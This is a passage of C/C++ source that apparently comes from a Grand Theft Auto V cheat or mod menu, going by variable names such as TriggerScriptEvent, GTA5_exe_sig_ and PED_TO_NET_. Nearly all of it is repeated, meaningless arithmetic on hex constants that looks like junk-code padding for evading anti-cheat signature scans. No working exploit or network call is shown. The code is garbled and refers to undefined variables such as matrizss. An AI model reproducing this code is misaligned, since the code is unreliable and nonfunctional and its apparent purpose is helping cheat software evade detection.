				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<Placement>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
